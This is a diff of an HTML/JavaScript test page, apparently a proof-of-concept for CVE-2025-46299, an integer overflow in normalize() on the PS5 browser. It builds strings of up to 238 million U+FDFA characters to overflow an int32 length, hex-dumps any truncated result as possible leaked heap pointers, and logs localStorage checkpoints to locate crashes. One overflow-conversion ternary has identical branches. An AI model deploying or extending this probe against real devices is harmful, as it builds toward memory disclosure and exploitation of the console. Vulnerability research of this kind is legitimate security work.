@@ -2,104 +2,133 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>PS5 CVE-2025-46299 — normalize() Integer Overflow</title>
+<title>PS5 CVE-2025-46299 — Checkpoint Logger</title>
 </head>
 <body>
 <pre id="log" style="white-space:pre-wrap; word-break:break-all; background:#111; color:#0F0; padding:10px;"></pre>
 <script>
 const L = s => { document.getElementById('log').textContent += s + '\n'; };
 
-L('[*] Starting normalize() integer overflow test...');
-
-// \uFDFA يتوسع 18x في NFKC
-// نحتاج ~238,609,295 حرف لتجاوز int32_t
-// الناتج = 238,609,295 * 18 = 4,294,967,310
-// int32_t overflow: 4,294,967,310 mod 2^32 = 14
-// إذا نجح هذا، سيُعاد نص بطول 14 حرفاً بدلاً من 4.3 مليار
-
-// نبدأ بأحجام أصغر ونتدرج
-const sizes = [
-    { name: '100M chars', count: 100000000, expected: 1800000000 },
-    { name: '119M chars (threshold)', count: 119304647, expected: 2147483646 },
-    { name: '120M chars (overflow!)', count: 120000000, expected: 2160000000 },
-    { name: '238M chars (wraps to ~14)', count: 238609295, expected: 4294967310 },
-];
-
-for (const test of sizes) {
-    L('\n--- Test: ' + test.name + ' ---');
-    L('[*] Creating string of ' + test.count + ' \\uFDFA characters...');
-    L('[*] Expected output: ' + test.expected + ' characters');
-    L('[*] int32_t max: 2,147,483,647');
-    
-    if (test.expected > 2147483647) {
-        L('[!] Expected output EXCEEDS int32_t max — overflow will occur!');
-        L('[!] Overflowed length: ' + (test.expected % 4294967296) + ' (as unsigned)');
-        L('[!] As signed int32: ' + (test.expected > 2147483647 ? test.expected - 4294967296 : test.expected));
-    }
-    
+// Checkpoint system — survives crashes via localStorage
+function checkpoint(msg) {
     try {
-        // إنشاء النص الكبير
-        let bigStr = '\uFDFA'.repeat(test.count);
-        L('[+] String created. Length: ' + bigStr.length);
-        L('[*] Memory usage: ~' + Math.round(bigStr.length * 2 / 1024 / 1024) + 'MB');
-        
-        // استدعاء normalize
-        L('[*] Calling normalize("NFKC")...');
-        let result = bigStr.normalize('NFKC');
-        
-        L('[+] normalize() returned!');
-        L('[+] Result length: ' + result.length);
-        L('[+] Expected length: ~' + test.expected);
-        
-        // فحص إذا كان الطول غير متوقع
-        if (result.length < bigStr.length) {
-            L('[!] LENGTH MISMATCH! Got ' + result.length + ' but expected ~' + test.expected);
-            L('[!] This indicates integer overflow in ICU!');
-            
-            // فحص المحتوى — هل يحتوي على بيانات غير متوقعة؟
-            L('[*] Checking result content for leaked data...');
-            let anomalies = 0;
-            let hexDump = [];
-            for (let i = 0; i < result.length; i++) {
-                let code = result.charCodeAt(i);
-                hexDump.push(code.toString(16).padStart(4, '0'));
-                // \uFDFA يتوسع إلى أحرف عربية محددة
-                // أي حرف خارج هذا النطاق قد يكون بيانات مسربة
-                if (code < 0x0620 || code > 0x06FF) {
-                    if (code !== 0x0020) { // مسافة
-                        anomalies++;
-                    }
-                }
-            }
-            L('[*] Result hex: ' + hexDump.join(' '));
-            if (anomalies > 0) {
-                L('[!] FOUND ' + anomalies + ' anomalous characters!');
-                L('[!] These may be leaked heap pointers!');
-            } else {
-                L('[*] All characters appear to be valid Arabic');
-                L('[*] But the length is wrong — truncation occurred');
-            }
-        } else if (result.length === test.expected) {
-            L('[*] Length matches expected — no overflow at this size');
-        } else {
-            L('[?] Unexpected length: ' + result.length);
-        }
-        
-        // تحرير الذاكرة
-        bigStr = null;
-        result = null;
-        
-    } catch (e) {
-        L('[!] Error: ' + e.message);
-        if (e.name === 'RangeError') {
-            L('[!] RangeError — string too large for repeat()');
-        }
+        localStorage.setItem('normalize_crash_cp', msg);
+        L('[CP] ' + msg);
+    } catch(e) {
+        L('[CP-FAIL] ' + msg);
     }
 }
 
-L('\n[*] Test finished.');
-L('[*] If any test showed LENGTH MISMATCH, the integer overflow is confirmed.');
-L('[*] On PS5 with no-zero allocator, the truncated buffer may contain heap pointers.');
+// On load, check for previous crash
+window.addEventListener('load', () => {
+    const lastCP = localStorage.getItem('normalize_crash_cp');
+    if (lastCP) {
+        L('[!] PREVIOUS CRASH DETECTED!');
+        L('[!] Last checkpoint before crash: ' + lastCP);
+        L('[!] This tells us exactly where the crash occurred.\n');
+    }
+    
+    runTest();
+});
+
+async function runTest() {
+    L('[*] Starting normalize() integer overflow test with checkpoints\n');
+    
+    // Test sizes — from safe to overflow
+    const tests = [
+        { name: '10M (safe)', count: 10000000, exp: 180000000 },
+        { name: '50M (safe)', count: 50000000, exp: 900000000 },
+        { name: '100M (safe)', count: 100000000, exp: 1800000000 },
+        { name: '119M (at limit)', count: 119304647, exp: 2147483646 },
+        { name: '119.3M (just over)', count: 119304648, exp: 2147483664 },
+        { name: '120M (overflow neg)', count: 120000000, exp: 2160000000 },
+        { name: '150M (overflow)', count: 150000000, exp: 2700000000 },
+        { name: '200M (overflow)', count: 200000000, exp: 3600000000 },
+        { name: '238.6M (wraps to 14)', count: 238609295, exp: 4294967310 },
+    ];
+    
+    for (const test of tests) {
+        L('=== Test: ' + test.name + ' ===');
+        L('  Input: ' + test.count + ' chars of \\uFDFA');
+        L('  Expected output: ' + test.exp);
+        L('  int32 overflow: ' + (test.exp > 2147483647 ? 'YES' : 'NO'));
+        
+        if (test.exp > 2147483647) {
+            const asInt32 = test.exp > 2147483647 
+                ? (test.exp > 4294967295 
+                    ? test.exp - 4294967296  // wraps past 2^32
+                    : test.exp - 4294967296)  // wraps past 2^31
+                : test.exp;
+            L('  As int32: ' + asInt32);
+            L('  As unsigned: ' + (asInt32 < 0 ? asInt32 + 4294967296 : asInt32));
+        }
+        
+        checkpoint('TEST_START:' + test.name + ' count=' + test.count);
+        
+        try {
+            // Step 1: Create the string
+            checkpoint('CREATE_STRING:' + test.count);
+            let bigStr = '\uFDFA'.repeat(test.count);
+            checkpoint('STRING_CREATED: len=' + bigStr.length);
+            L('  [+] String created. Length: ' + bigStr.length);
+            L('  [*] Memory: ~' + Math.round(bigStr.length * 2 / 1024 / 1024) + 'MB');
+            
+            // Step 2: Call normalize
+            checkpoint('CALL_NORMALIZE:NFKC');
+            L('  [*] Calling normalize("NFKC")...');
+            
+            let result = bigStr.normalize('NFKC');
+            
+            checkpoint('NORMALIZE_DONE: resultLen=' + result.length);
+            L('  [+] normalize() returned!');
+            L('  [+] Result length: ' + result.length);
+            
+            // Step 3: Analyze result
+            if (result.length !== test.exp && result.length < 1000) {
+                L('  [!] SHORT RESULT! Got ' + result.length + ' expected ~' + test.exp);
+                L('  [!] This indicates integer overflow!');
+                
+                // Dump the content
+                let hex = [];
+                for (let i = 0; i < Math.min(result.length, 64); i++) {
+                    hex.push(result.charCodeAt(i).toString(16).padStart(4, '0'));
+                }
+                L('  [!] Hex dump: ' + hex.join(' '));
+                L('  [!] If these aren\'t all Arabic chars, we have a LEAK!');
+                
+                checkpoint('LEAK_DETECTED: resultLen=' + result.length);
+            } else if (result.length === test.exp) {
+                L('  [*] Length matches — no overflow at this size');
+            } else {
+                L('  [?] Unexpected length: ' + result.length + ' (expected ' + test.exp + ')');
+            }
+            
+            // Cleanup
+            bigStr = null;
+            result = null;
+            checkpoint('CLEANUP_DONE');
+            
+        } catch (e) {
+            L('  [!] Error: ' + e.name + ': ' + e.message);
+            checkpoint('ERROR:' + e.name + ':' + e.message);
+            
+            if (e.name === 'RangeError') {
+                L('  [!] RangeError — repeat() or normalize() rejected the size');
+            } else if (e.name === 'InternalError') {
+                L('  [!] InternalError — possible OOM or engine limit');
+            }
+        }
+        
+        L('');
+        
+        // Small delay between tests
+        await new Promise(r => setTimeout(r, 100));
+    }
+    
+    checkpoint('ALL_TESTS_DONE');
+    L('[*] All tests finished.');
+    L('[*] If the browser crashed during any test, reopen this page to see the last checkpoint.');
+}
 </script>
 </body>
 </html>
